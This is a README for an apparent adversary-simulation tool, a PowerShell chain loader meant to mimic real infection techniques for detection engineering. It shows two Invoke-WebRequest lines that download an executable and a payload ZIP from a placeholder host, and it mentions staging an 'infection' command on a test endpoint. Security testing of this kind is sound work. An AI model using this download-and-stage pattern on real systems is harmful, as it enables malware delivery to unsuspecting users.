# PWSH Chain Loader Usage

## Payload Creation

Edit the `nexus-validation.txt` file to change the URL of the two `Invoke-WebRequest` commands. These should point to where you will be hosting the beinign payloads.

_Example:_

```
Invoke-WebRequest -Uri 'https://<mysite.com>/7z.exe' -OutFile $tool -UseBasicParsing
Invoke-WebRequest -Uri 'https://<mysite.com>/nexus_payload.zip' -OutFile $zip -UseBasicParsing
```

Review the code in `nexus_connector_sim.c` to ensure for yourself that the payload is 100% benign. You may use the included `NexusConnector.exe`, or use `make` to build it yourself.

Once you have your `NexusConnector.exe` add it to a ZIP archive `nexus_payload.zip` or use the one provided.

## Payload Hosting

Copy all three files `7z.exe`, `nexus_payload.zip`, and `nexus-validation.txt` to the URL of your choice. If you do not place all three files in the root of the site, you will need to ensure the "infection" command leveraged on the test endpoint points to that URL, as well as the two `Invoke-WebRequest` locations you set in `nexus-validation.txt` above.

## Disclaimer

This repository is provided for educational, research, testing, and defensive security purposes only. The code contained herein is intended to simulate infection techniques observed in real-world environments to assist with security analysis, detection engineering, threat hunting, and incident response activities.

By accessing, downloading, or using any code in this repository, you acknowledge that you do so entirely at your own risk. The repository owner and contributors make no warranties, express or implied, regarding the safety, suitability, reliability, or fitness of the code for any purpose.

Users are solely responsible for ensuring their use of this repository complies with all applicable laws, regulations, policies, and contractual obligations. Any use of the code for unauthorized, malicious, illegal, or unethical activities is strictly prohibited.

The repository owner and contributors assume no responsibility or liability for any direct, indirect, incidental, consequential, or other damages resulting from the use, misuse, modification, distribution, or execution of any code contained in this repository.
